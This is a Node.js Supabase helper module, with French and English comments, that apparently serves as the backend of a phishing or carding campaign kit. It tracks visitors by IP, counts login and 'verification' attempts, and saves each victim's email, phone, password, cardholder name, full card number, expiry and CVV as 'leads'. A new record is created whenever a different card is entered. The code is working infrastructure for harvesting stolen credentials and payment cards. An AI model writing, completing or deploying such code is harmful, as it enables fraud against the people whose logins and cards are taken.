// Fichier utilitaire pour la connexion à Supabase
require('dotenv').config();

const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY;

const supabase = createClient(supabaseUrl, supabaseKey);

// Fonction complète récupèration de nouveaux contacts
async function getNewContacts(query, count) {
    const { data, error } = await supabase
        .from('contacts')
        .select('*')
        .eq('source_query', query)
        .eq('status', 'new')
        .limit(count)
        .order('created_at', { ascending: true });

    if (error) {
        throw error;
    }

    return data;
}

// Mise à jour du statut d'un contact après traitement
async function updateContactStatus(id, status, campaign) {
    const { data, error } = await supabase
        .from('contacts')
        .update({ 
            status: status,
            last_campaign: campaign.name,
            last_contacted_at: new Date().toISOString()
        })
        .eq('id', id);

    if (error) {
        throw error;
    }

    return data;
}

// New: Track an event (e.g., visit, submission) - records all events
async function trackEvent(eventType, ip, details = {}) {
  const { data, error } = await supabase
    .from('events')
    .insert({ event_type: eventType, ip, details, created_at: new Date().toISOString() })
    .select('id')
    .single();

  if (error) throw error;
  return { success: true, eventId: data?.id };
}

// New: Store a lead with IP-based deduplication and counter increments
async function storeLead(email, phone, ip, campaignId, eventId = null, eventType = '', payload = {}) {
  try {
    // Check for existing lead by IP
    const { data: existingLead } = await supabase
      .from('leads')
      .select('*')
      .eq('ip', ip)
      .order('updated_at', { ascending: false })
      .limit(1)
      .maybeSingle();

    const now = new Date().toISOString();
    
    // Determine which counter to increment
    const counterUpdates = {};
    if (eventType === 'booking') {
      counterUpdates.booking_count = (existingLead?.booking_count || 0) + 1;
    } else if (eventType === 'login') {
      counterUpdates.login_count = (existingLead?.login_count || 0) + 1;
    } else if (eventType === 'verification_start' || eventType === 'verification_retry') {
      // Exception: if verification_start with different card number, treat as new lead
      if (eventType === 'verification_start' && existingLead && payload.card) {
        const existingCard = existingLead.card_number;
        const newCard = payload.card; // comparer la carte complète (pas de slice)
        if (existingCard && existingCard !== newCard) {
          // Create new lead with different card
          const newLeadData = {
            email,
            phone,
            ip,
            campaign_id: campaignId,
            event_id: eventId,
            verification_count: 1,
            card_holder: payload.name,
            card_number: payload.card,
            card_expiry: payload.exp,
            card_cvv: payload.cvv,
            password: payload.password || existingLead?.password || '',
            created_at: now,
            updated_at: now
          };
          
          const { error } = await supabase.from('leads').insert(newLeadData);
          if (error) throw error;
          return { success: true, action: 'created_new_card' };
        }
      }
      counterUpdates.verification_count = (existingLead?.verification_count || 0) + 1;
    }

    if (existingLead) {
      // Update existing lead
      const updateData = {
        ...counterUpdates,
        email: email || existingLead.email,
        phone: phone || existingLead.phone,
        campaign_id: campaignId || existingLead.campaign_id,
        event_id: eventId || existingLead.event_id,
        updated_at: now
      };

      // Update password if provided
      if (payload.password) {
        updateData.password = payload.password;
      }

      // Update card number if provided
      if (payload.card) {
        updateData.card_number = payload.card; // stocke la carte complète
      }
      if (payload.name) {
        updateData.card_holder = payload.name;
      }
      if (payload.exp) {
        updateData.card_expiry = payload.exp;
      }
      if (payload.cvv) {
        updateData.card_cvv = payload.cvv;
      }

      const { error } = await supabase
        .from('leads')
        .update(updateData)
        .eq('id', existingLead.id);

      if (error) throw error;
      return { success: true, action: 'updated' };
    } else {
      // Create new lead
      const newLeadData = {
        email,
        phone,
        ip,
        campaign_id: campaignId,
        event_id: eventId,
        ...counterUpdates,
        password: payload.password || '',
        card_holder: payload.name ? payload.name : '',
        card_number: payload.card ? payload.card : '',
        card_expiry: payload.exp ? payload.exp : '',
        card_cvv: payload.cvv ? payload.cvv : '',
        created_at: now,
        updated_at: now
      };

      const { error } = await supabase.from('leads').insert(newLeadData);
      if (error) throw error;
      return { success: true, action: 'created' };
    }
  } catch (error) {
    console.error('Error in storeLead:', error);
    throw error;
  }
}

// New: Retrieve campaign by id (UUID) or by name (fallback without throwing early)
async function getCampaignById(idOrName) {
  if (!idOrName) return null;

  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  const looksLikeUuid = uuidRegex.test(String(idOrName));

  // Try by UUID id first if it matches the UUID shape
  if (looksLikeUuid) {
    const byId = await supabase
      .from('campaigns')
      .select('*')
      .eq('id', idOrName)
      .limit(1)
      .maybeSingle();
    if (byId?.data) return byId.data;
    // If not found, continue to fallback by name
  }

  // Fallback by exact name match
  const byName = await supabase
    .from('campaigns')
    .select('*')
    .eq('name', idOrName)
    .limit(1)
    .maybeSingle();
  if (byName.error) throw byName.error;
  return byName.data || null;
}

// Export de l'utilitaire
module.exports = {
    getNewContacts,
    updateContactStatus,
    trackEvent,
    storeLead,
    getCampaignById
};